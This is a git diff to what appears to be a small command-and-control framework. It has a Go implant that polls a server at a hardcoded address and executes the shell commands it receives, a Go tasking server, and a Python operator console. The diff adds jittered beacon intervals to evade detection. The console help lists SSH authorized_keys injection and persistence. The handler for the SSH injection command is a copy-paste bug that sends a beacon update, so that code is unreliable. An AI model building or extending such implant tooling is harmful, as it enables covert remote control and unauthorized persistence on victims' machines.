diff --git a/agents/agent.go b/agents/agent.go
index 0a47800..d3b4172 100644
--- a/agents/agent.go
+++ b/agents/agent.go
@@ -7,18 +7,22 @@ import (
 	"io"
 	"net/http"
 	"os/exec"
+	"math/rand"
 	"time"
+	// "github.com/coder/websocket"
 )
 
 const (
 	ServerURL = "http://192.168.1.172:8080" 
-	AgentID   = "agent-linux-test"
+	AgentID   = "test"
 	PollDelay = 2 * time.Second
 )
 
 type PollResponse struct {
 	Status  string `json:"status"`
 	Command string `json:"command"`
+	Interval int    `json:"interval"` 
+    Jitter   int    `json:"jitter"`   
 }
 
 type OutputPayload struct {
@@ -26,10 +30,61 @@ type OutputPayload struct {
 	Output string `json:"output"`
 }
 
+
+
+
+//---------
+
+//ch-beacon
+func calculateSleep(baseInterval int, jitterPercent int) time.Duration {
+    if baseInterval <= 0 {
+        baseInterval = 5
+    }
+    if jitterPercent <= 0 {
+        return time.Duration(baseInterval) * time.Second
+    }
+
+    jitterMax := float64(baseInterval) * (float64(jitterPercent) / 100.0)
+    jitterOffset := (rand.Float64() * 2 * jitterMax) - jitterMax
+    finalInterval := float64(baseInterval) + jitterOffset
+
+    if finalInterval < 1 {
+        finalInterval = 1
+    }
+    return time.Duration(finalInterval * float64(time.Second))
+}
+
+func sendOutput(agentID string, output string) {
+	outputURL := fmt.Sprintf("%s/api/agent/output", ServerURL)
+	payload := OutputPayload{
+		ID:     agentID,
+		Output: output,
+	}
+
+	jsonData, err := json.Marshal(payload)
+	if err != nil {
+		fmt.Printf("[-] Error marshalling payload: %v\n", err)
+		return
+	}
+
+	resp, err := http.Post(outputURL, "application/json", bytes.NewBuffer(jsonData))
+	if err != nil {
+		fmt.Printf("[-] Error sending output: %v\n", err)
+		return
+	}
+	defer resp.Body.Close()
+
+	fmt.Println("[+] Output sent back to server successfully.")
+}
+
+
 func main() {
 	fmt.Printf("[*] Starting agent %s...\n", AgentID)
 	fmt.Printf("[*] Polling server at %s every %v\n", ServerURL, PollDelay)
 
+	currentInterval := 5
+    currentJitter := 0
+
 	for {
 		// poll to server ep
 		pollURL := fmt.Sprintf("%s/api/agent/poll?id=%s", ServerURL, AgentID)
@@ -49,12 +104,21 @@ func main() {
 		}
 
 		var pollResp PollResponse
+
 		if err := json.Unmarshal(body, &pollResp); err != nil {
 			fmt.Printf("[-] Error parsing JSON: %v\n", err)
 			time.Sleep(PollDelay)
 			continue
 		}
 
+        if pollResp.Interval > 0 {
+            currentInterval = pollResp.Interval
+        }
+        currentJitter = pollResp.Jitter
+
+
+
+
 		//exec assinged task
 		if pollResp.Status == "task_assigned" && pollResp.Command != "" {
 			fmt.Printf("[+] Received command: %s\n", pollResp.Command)
@@ -81,29 +145,8 @@ func main() {
 		}
 
 		//poll delay
-		time.Sleep(PollDelay)
+		time.Sleep(calculateSleep(currentInterval, currentJitter))
 	}
 }
 
-func sendOutput(agentID string, output string) {
-	outputURL := fmt.Sprintf("%s/api/agent/output", ServerURL)
-	payload := OutputPayload{
-		ID:     agentID,
-		Output: output,
-	}
 
-	jsonData, err := json.Marshal(payload)
-	if err != nil {
-		fmt.Printf("[-] Error marshalling payload: %v\n", err)
-		return
-	}
-
-	resp, err := http.Post(outputURL, "application/json", bytes.NewBuffer(jsonData))
-	if err != nil {
-		fmt.Printf("[-] Error sending output: %v\n", err)
-		return
-	}
-	defer resp.Body.Close()
-
-	fmt.Println("[+] Output sent back to server successfully.")
-}
diff --git a/agents/go.mod b/agents/go.mod
index 1a1c219..d57e7f8 100644
--- a/agents/go.mod
+++ b/agents/go.mod
@@ -1,3 +1,5 @@
 module agents
 
 go 1.27.1
+
+require github.com/coder/websocket v1.8.15 // indirect
diff --git a/cliclient/main.py b/cliclient/main.py
index e79b2a4..96b2eb6 100644
--- a/cliclient/main.py
+++ b/cliclient/main.py
@@ -4,6 +4,8 @@ import readline #for semi shell interaction in input()
 import asyncio
 import json
 import websockets
+import sys
+
 
 from prompt_toolkit import PromptSession, print_formatted_text
 from prompt_toolkit.formatted_text import ANSI
@@ -78,12 +80,17 @@ def all_actions(actions):
     - clear
 
     - sh <shell cmd>
+    - ch-beacon <seconds> [jitter%]
+        change agent polling interval by second
+        es. ch-beacon 3600 50 , make polling of 1h + jitter
+
     - upload <mypath> <agentpath>
     - download  <agentpath> <mypath>
 
-    - dir-sh
-        direct shell via ws [{RED}can lower your OPSEC{RESET}]
 
+    - ssh-key-inj <raw pub key>
+        injects your key in the ~/.ssh/authorized_keys file
+        
     - percistance 
         systemd, windows reg
         
@@ -99,28 +106,16 @@ def command_not_fount():
 
 
 
-async def useMode_wsCom(websocket, action, agent_id, data):
-    # task queue
-    payload = {
-        "action": "queue_task",
-        "agent_id": agent_id,
-        "data": data
-    }
-    
-    await websocket.send(json.dumps(payload))
-    response_raw = await websocket.recv()
-    response = json.loads(response_raw)
-    
-    print_formatted_text(ANSI(f"\n[Server Response] :\n{response.get('output')}\n"))
+
 
 async def event_listener(event_url):
     try:
         print(f"\n[DEBUG] connect to channer events: {event_url}")
         async with websockets.connect(event_url) as ws:
-            print(f"[DEBUG] channel connected waiting for data")
+            print(f"[DEBUG] ")
             while True:
                 response_raw = await ws.recv()
-                print(f"[DEBUG] Ricevuto dal server eventi: {response_raw}")
+                print(f"[DEBUG] : {response_raw}")
                 
                 response = json.loads(response_raw)
                 if response.get("type") == "agent_output":
@@ -135,6 +130,10 @@ async def event_listener(event_url):
 
 
 
+
+
+
+
 async def use_agent(websocket, agent_id, session):
 
     with patch_stdout():
@@ -173,20 +172,58 @@ async def use_agent(websocket, agent_id, session):
                 await websocket.send(json.dumps(payload))
                 _ = await websocket.recv()
                 
-                print_formatted_text(ANSI(f"\n{BLUE}[*] Task queued. Output will arrive via background stream.{RESET}\n"))
+                print_formatted_text(ANSI(f"\n{BLUE}[*] Task queued. wait for output...{RESET}\n"))
                 continue
 
+            elif action == "ch-beacon":
+                if len(parts) < 2:
+                    print_formatted_text(ANSI(f"[{RED}-{RESET}] Error: specify second and jitter (es. ch-beacon 60 10)"))
+                    continue
+                
+                interval = parts[1]
+                jitter = parts[2] if len(parts) > 2 else "0"
+                
+                payload = {
+                    "action": "update_beacon",
+                    "agent_id": agent_id,
+                    "interval": int(interval),
+                    "jitter": int(jitter)
+                }
+                await websocket.send(json.dumps(payload))
+                _ = await websocket.recv()
+                
+                print_formatted_text(ANSI(f"\n{GREEN}[+] Beacon updated: {interval}s (Jitter: {jitter}%){RESET}\n"))
+                continue
+            
+            elif action == "ssh-key-inj":
+                if len(parts) < 2:
+                    print_formatted_text(ANSI(f"[{RED}-{RESET}] Error: specify seconds, jitter (es. ch-beacon 60 10)"))
+                    continue
+                
+                interval = parts[1]
+                jitter = parts[2] if len(parts) > 2 else "0"
+                
+                payload = {
+                    "action": "update_beacon",
+                    "agent_id": agent_id,
+                    "interval": int(interval),
+                    "jitter": int(jitter)
+                }
+                await websocket.send(json.dumps(payload))
+                _ = await websocket.recv()
+                
+                print_formatted_text(ANSI(f"\n{GREEN}[+] Beacon updated: {interval}s (Jitter: {jitter}%){RESET}\n"))
+                continue
+
+
+
             # elif action == "download":
-            #
-            #     await useMode_wsCom(websocket,action,agent_id)
             #     continue
             #
             # elif action == "upload":
-            #     await useMode_wsCom(websocket,action,agent_id)
             #     continue
             #
             # elif action == "percistance":
-            #     await useMode_wsCom(websocket,action,agent_id)
             #     continue
 
             else:
@@ -222,6 +259,8 @@ async def main(server_url, event_url):
                     if action == "help":
                         all_actions("main")
                         continue
+                    elif action == "exit":
+                        print("press ctrl + C to exit")
                     elif action == "clear":
                         clear()
                         continue
diff --git a/server/srv.go b/server/srv.go
index 6c88c2d..98e4ce1 100644
--- a/server/srv.go
+++ b/server/srv.go
@@ -17,8 +17,11 @@ type AgentSession struct {
 	LastSeen    time.Time `json:"last_seen"`
 	TaskQueue   []string  `json:"task_queue"`   // agent task list
 	OutputQueue []string  `json:"output_queue"` // agent output list 
+	Interval     int             `json:"interval"` // polling
+    Jitter       int             `json:"jitter"`   // jitter
+
 }
-//map off al the agents
+
 var (
 	clients = make(map[string]*AgentSession)
 	mu      sync.Mutex
@@ -69,6 +72,7 @@ func handleEvents(c *gin.Context) {
 }
 
 
+
 func handleOperator(c *gin.Context) {
 	opts := &websocket.AcceptOptions{
 		InsecureSkipVerify: true,
@@ -117,7 +121,6 @@ func handleOperator(c *gin.Context) {
 			command := msg["data"].(string)
 
 			mu.Lock()
-			// Se l'agente non esiste, lo creiamo al volo
 			if _, exists := clients[agentID]; !exists {
 				clients[agentID] = &AgentSession{
 					ID:        agentID,
@@ -147,6 +150,22 @@ func handleOperator(c *gin.Context) {
 				"status": "success",
 				"agents": agentList,
 			})
+		} else if action == "update_beacon" {
+			agentID := msg["agent_id"].(string)
+			interval := int(msg["interval"].(float64))
+			jitter := int(msg["jitter"].(float64))
+
+			mu.Lock()
+			if session, exists := clients[agentID]; exists {
+				session.Interval = interval
+				session.Jitter = jitter
+			} else {
+				clients[agentID] = &AgentSession{ID: agentID, Interval: interval, Jitter: jitter}
+			}
+			mu.Unlock()
+
+			wsjson.Write(ctx, conn, map[string]string{"status": "success", "output": "Beacon updated."})
+
 		}
 	}
 }
@@ -168,43 +187,46 @@ func main() {
 
 	// GET /api/agent/poll?id=<agent id>
 	r.GET("/api/agent/poll", func(c *gin.Context) {
-		agentID := c.Query("id")
-		if agentID == "" {
-			c.JSON(http.StatusBadRequest, gin.H{"error": "Missing agent ID"})
-			return
-		}
+        agentID := c.Query("id")
+        if agentID == "" {
+            c.JSON(http.StatusBadRequest, gin.H{"error": "Missing agent ID"})
+            return
+        }
 
-		mu.Lock()
-		defer mu.Unlock()
-
-		session, exists := clients[agentID]
-		//automatinc session
-		if !exists {
-			clients[agentID] = &AgentSession{
-				ID:        agentID,
-				LastSeen:  time.Now(),
-				TaskQueue: []string{},
-			}
-			c.JSON(http.StatusOK, gin.H{"status": "no_tasks", "command": ""})
-			return
-		}
+        mu.Lock()
+        defer mu.Unlock()
+
+        session, exists := clients[agentID]
+        if !exists {
+            clients[agentID] = &AgentSession{
+                ID:        agentID,
+                LastSeen:  time.Now(),
+                TaskQueue: []string{},
+                Interval:  5,
+                Jitter:    0,
+            }
+            session = clients[agentID]
+        }
 
-		session.LastSeen = time.Now()
+        session.LastSeen = time.Now()
+
+        status := "no_tasks"
+        command := ""
+        if len(session.TaskQueue) > 0 {
+            status = "task_assigned"
+            command = session.TaskQueue[0]
+            session.TaskQueue = session.TaskQueue[1:]
+        }
 
-		if len(session.TaskQueue) == 0 {
-			c.JSON(http.StatusOK, gin.H{"status": "no_tasks", "command": ""})
-			return
-		}
 
-		//fifo of the fist comand
-		command := session.TaskQueue[0]
-		session.TaskQueue = session.TaskQueue[1:]
 
 		c.JSON(http.StatusOK, gin.H{
-			"status":  "task_assigned",
-			"command": command,
+			"status":   status,
+			"command":  command,
+			"interval": session.Interval,
+			"jitter":   session.Jitter,
 		})
-	})
+    })
 
 
 
